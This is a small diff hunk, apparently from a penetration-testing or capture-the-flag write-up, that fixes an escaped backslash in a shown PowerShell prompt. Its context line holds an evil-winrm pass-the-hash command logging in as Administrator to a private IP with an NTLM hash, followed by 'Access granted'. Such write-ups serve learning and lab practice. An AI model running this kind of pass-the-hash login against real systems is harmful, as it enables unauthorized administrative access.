@@ -253,7 +253,7 @@ evil-winrm -i 10.81.177.112 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 Access granted:
 
 ```
-PS C:\\Users\Administrator>
+PS C:\Users\Administrator>
 ```
 
 ---
